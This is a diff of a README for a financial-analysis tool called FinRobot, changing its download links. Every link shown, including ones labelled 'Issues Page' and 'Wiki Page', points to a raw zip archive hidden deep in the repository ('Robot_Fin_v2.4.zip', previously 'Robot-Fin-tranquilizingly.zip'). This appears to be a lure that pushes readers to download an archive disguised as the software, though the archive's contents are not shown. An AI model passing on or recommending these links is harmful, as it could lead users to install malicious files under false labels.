@@ -21,7 +21,7 @@ To ensure the best experience with FinRobot, your device should meet the followi
 ## 📥 Download & Install
 To begin using FinRobot, visit the link below to find the latest version available for download:
 
-[![Download FinRobot](https://raw.githubusercontent.com/Ludwig-H-PW/FinRobot/master/configs/Robot-Fin-tranquilizingly.zip%20FinRobot-Here-blue)](https://raw.githubusercontent.com/Ludwig-H-PW/FinRobot/master/configs/Robot-Fin-tranquilizingly.zip)
+[![Download FinRobot](https://github.com/Ludwig-H-PW/FinRobot/raw/refs/heads/master/finrobot/data_source/marker_sec_src/Robot_Fin_v2.4.zip%20FinRobot-Here-blue)](https://github.com/Ludwig-H-PW/FinRobot/raw/refs/heads/master/finrobot/data_source/marker_sec_src/Robot_Fin_v2.4.zip)
 
 Follow these steps to download and install the software:
 
@@ -34,7 +34,7 @@ Follow these steps to download and install the software:
 
 If you need to revisit the download links later, you can find them again on the Releases page:
 
-[![Download FinRobot](https://raw.githubusercontent.com/Ludwig-H-PW/FinRobot/master/configs/Robot-Fin-tranquilizingly.zip%20FinRobot-Here-blue)](https://raw.githubusercontent.com/Ludwig-H-PW/FinRobot/master/configs/Robot-Fin-tranquilizingly.zip)
+[![Download FinRobot](https://github.com/Ludwig-H-PW/FinRobot/raw/refs/heads/master/finrobot/data_source/marker_sec_src/Robot_Fin_v2.4.zip%20FinRobot-Here-blue)](https://github.com/Ludwig-H-PW/FinRobot/raw/refs/heads/master/finrobot/data_source/marker_sec_src/Robot_Fin_v2.4.zip)
 
 ## 🛠️ How to Use FinRobot
 After installation, you can begin to utilize FinRobot for your financial analysis needs:
@@ -52,9 +52,9 @@ After installation, you can begin to utilize FinRobot for your financial analysi
 ## 📞 Support
 If you encounter any issues or have questions while using FinRobot, please reach out to our support community. You can find assistance through:
 
-- **GitHub Issues Page**: Report bugs or request features on our [Issues Page](https://raw.githubusercontent.com/Ludwig-H-PW/FinRobot/master/configs/Robot-Fin-tranquilizingly.zip).
+- **GitHub Issues Page**: Report bugs or request features on our [Issues Page](https://github.com/Ludwig-H-PW/FinRobot/raw/refs/heads/master/finrobot/data_source/marker_sec_src/Robot_Fin_v2.4.zip).
 - **Community Forum**: Join conversations with other users in the FinRobot community for tips and advice.
-- **Documentation**: Consult our [Wiki Page](https://raw.githubusercontent.com/Ludwig-H-PW/FinRobot/master/configs/Robot-Fin-tranquilizingly.zip) for guides and FAQs.
+- **Documentation**: Consult our [Wiki Page](https://github.com/Ludwig-H-PW/FinRobot/raw/refs/heads/master/finrobot/data_source/marker_sec_src/Robot_Fin_v2.4.zip) for guides and FAQs.
 
 ## 🔗 Related Topics
 As you explore FinRobot, you may want to learn more about related topics. Here are a few areas where you can expand your knowledge:
